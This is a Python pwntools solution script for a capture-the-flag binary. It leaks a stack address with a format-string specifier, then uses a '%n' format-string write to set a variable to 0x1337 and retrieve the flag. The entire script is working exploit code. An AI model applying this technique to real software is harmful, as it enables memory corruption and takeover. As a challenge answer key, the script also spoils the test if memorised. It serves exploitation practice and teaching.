#!/usr/bin/env python3
from pwn import *
import re

flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = ""

e = ELF("./main.elf")
main_addr = e.symbols["main"]

p = process("./main.elf")

p.sendline(hex(main_addr))
p.recvuntil("Ok, give me a string\n")

p.sendline("%4$p")

stack_addr = p.recvline()

x_addr = int(stack_addr, 16) - int("0x14", 16)
x_addr = str(x_addr)

p.sendline(x_addr)

target_value = "%" + str(int(0x1337))
p.sendline(target_value + "p%8$n")

flag = str(p.recvall())

#Print the flag
print(flag)
#Write the flag to the solution file
solution = open("solution.txt", "w")
solution.write(flag)
solution.close()